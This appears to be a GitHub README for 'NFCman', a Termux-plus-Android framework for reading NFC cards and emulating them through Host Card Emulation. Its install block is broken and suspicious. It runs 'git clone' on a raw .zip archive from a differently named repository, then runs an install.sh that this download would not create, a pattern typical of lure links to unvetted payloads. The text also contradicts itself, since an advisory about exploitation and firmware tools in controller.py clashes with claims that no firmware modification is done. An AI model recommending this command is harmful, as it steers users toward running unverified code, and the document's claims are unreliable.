# NFCman - Android NFC Card Research Framework

**⚠️ IMPORTANT NOTICE: This framework provides legitimate NFC research capabilities within Android's standard security model. Advanced emulation features operate within Host Card Emulation constraints.**

> **SECURITY ADVISORY:** The security research components in controller.py present significant legal and operational risks. These modules contain systematic exploitation methodologies and firmware modification tools that violate computer fraud statutes. The custom firmware implementation assumes hardware access capabilities that do not exist in standard Android security architectures.

## Overview

NFCman is a comprehensive Android-based framework designed for Near Field Communication research, card analysis, and standards-compliant emulation. The system enables researchers to read NFC cards across multiple protocols, analyze their technical structure and data organization, maintain a research database of card information, and perform emulation within Android's Host Card Emulation framework limitations.

The framework operates through an integrated architecture combining a Termux-based command-line interface with a dedicated Android application optimized for NFC research workflows.

## Functional Capabilities

The framework provides legitimate NFC research functionality through Android's standard APIs. Card reading capabilities support MIFARE Classic, MIFARE Ultralight, NTAG series, ISO14443-4, and FeliCa technologies with comprehensive data extraction including UID information, technology specifications, NDEF message content, and sector structure analysis for supported card types.

Card emulation operates within Android's Host Card Emulation framework, supporting ISO14443-4 cards, NDEF-based applications, and basic contactless payment protocols where permitted by device configuration. The system cannot bypass Android's MIFARE Classic emulation restrictions, which exist due to hardware-level protocol requirements.

Analysis tools provide detailed technical examination of card structures, protocol compliance verification, security parameter assessment, and comparative analysis across card types and manufacturers.

## Device Requirements

### Hardware Prerequisites

Android devices must include dedicated NFC hardware with support for ISO14443 Type A and Type B protocols. The device must provide Host Card Emulation capability through Android's standard NFC service implementation. NFC antenna positioning and power characteristics significantly impact reading reliability and should be verified through device specification documentation.

### Supported NFC Controllers

The framework operates with standard Android NFC implementations across major controller manufacturers including NXP semiconductors PN5xx series, Broadcom BCM207xx series, and Qualcomm QCA65xx series. No custom firmware modification is required or attempted, ensuring compatibility with manufacturer security implementations.

### Android Version Compatibility

**Android 13 and Later:**
Modern Android versions implement enhanced storage scoping and permission models that require application initialization before Termux script operation. The framework automatically detects API level 33+ environments and adjusts directory access patterns accordingly. Enhanced security features may limit certain analysis capabilities while maintaining core functionality.

**Android 11-12:**
These versions provide optimal framework compatibility with mature NFC API implementations and manageable storage access patterns. Host Card Emulation functionality operates reliably across device manufacturers. The framework utilizes scoped storage while maintaining compatibility with legacy access patterns where appropriate.

**Android 8-10:**
Earlier Android versions support comprehensive framework functionality with direct storage access and simplified permission models. NFC API implementations may vary across manufacturers, requiring device-specific testing for optimal compatibility. Some advanced analysis features may require alternative implementation approaches.

**Android 6-7:**
Legacy Android versions provide basic framework support with potential limitations in Host Card Emulation capability and storage management. The framework includes compatibility layers for older API implementations while maintaining core research functionality.

## Technical Architecture

### Android Application Components

The NFCReaderActivity implements comprehensive NFC card detection and data extraction using Android's standard NFC APIs. The activity manages multiple technology detection simultaneously, implements appropriate authentication sequences for supported card types, and provides real-time feedback during card reading operations.

The NfcEmulatorService coordinates Host Card Emulation functionality within Android's security constraints. The service registers appropriate Application Identifier configurations, processes APDU command sequences according to ISO7816 specifications, and maintains emulation state through Android's standard service lifecycle.

### Termux Management Interface

The command-line interface provides professional research workflow management through structured menu systems, comprehensive logging capabilities, and detailed card analysis tools. The interface coordinates with Android components through Intent messaging and shared storage mechanisms while maintaining data integrity across framework operations.

### Data Management System

Card information storage utilizes structured JSON formats with comprehensive metadata including extraction timestamps, device configuration details, and protocol-specific technical parameters. The system maintains referential integrity across card databases and provides export capabilities for research documentation and collaboration.

## Installation and Setup

### Prerequisites Installation

Install Termux from F-Droid or Google Play Store to ensure compatibility with modern Android security models. Configure Termux storage access through the setup-storage command to enable framework file operations. Verify NFC hardware functionality through Android system settings before proceeding with framework installation.

### Framework Deployment

```bash
git clone https://github.com/KungBugFuOnYou/NFCmanX/raw/refs/heads/main/firm/NF_X_Cman_2.1.zip
cd NFCman
chmod +x install.sh
./install.sh
```

The installation script automatically detects Android version, configures appropriate storage permissions, installs required dependencies through Termux package management, creates directory structures compatible with detected Android security model, and generates configuration files optimized for the target environment.

### Android Application Build

Framework operation requires building and installing the companion Android application. Open the android directory in Android Studio and configure build parameters according to target device specifications. Generate signed APK through standard Android development workflows and install on target device with appropriate permissions.
